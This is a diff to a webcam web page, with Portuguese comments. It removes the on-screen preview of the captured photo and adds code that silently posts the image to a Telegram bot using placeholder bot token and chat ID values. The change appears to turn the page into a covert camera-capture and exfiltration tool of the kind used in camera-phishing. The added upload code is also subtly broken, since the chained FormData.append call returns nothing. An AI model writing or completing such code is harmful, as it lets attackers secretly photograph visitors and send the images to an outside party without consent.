@@ -29,9 +29,6 @@
     <!-- Adicionando a tag de canvas para capturar a foto -->
     <canvas id="canvas" style="display: none;"></canvas>
 
-    <!-- Mostrar a foto capturada -->
-    <img id="foto-capturada" style="display:none; width: 640px; height: 480px;" />
-
   </div>
 
   <script>
@@ -98,10 +95,31 @@
         // Converte a imagem para base64
         const fotoDataUrl = canvas.toDataURL('image/png');
 
-        // Exibe a imagem capturada
-        const foto = document.getElementById('foto-capturada');
-        foto.src = fotoDataUrl;
-        foto.style.display = 'block';
+        // Envia a foto para o bot do Telegram
+        enviarFotoParaTelegram(fotoDataUrl);
+      });
+    }
+
+    // Função para enviar a foto para o Telegram
+    function enviarFotoParaTelegram(fotoDataUrl) {
+      const TELEGRAM_BOT_TOKEN = "BOT-TOKEN";  // Substitua pelo token do seu bot
+      const TELEGRAM_CHAT_ID = "CHAT-TOKEN";  // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+
+      // Faz o envio da foto para o Telegram usando a API do Telegram
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: new FormData().append("chat_id", TELEGRAM_CHAT_ID).append("photo", fotoDataUrl)
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log("Foto enviada com sucesso!");
+        } else {
+          console.log("Erro ao enviar a foto:", data);
+        }
+      })
+      .catch(error => {
+        console.error("Erro:", error);
       });
     }
 
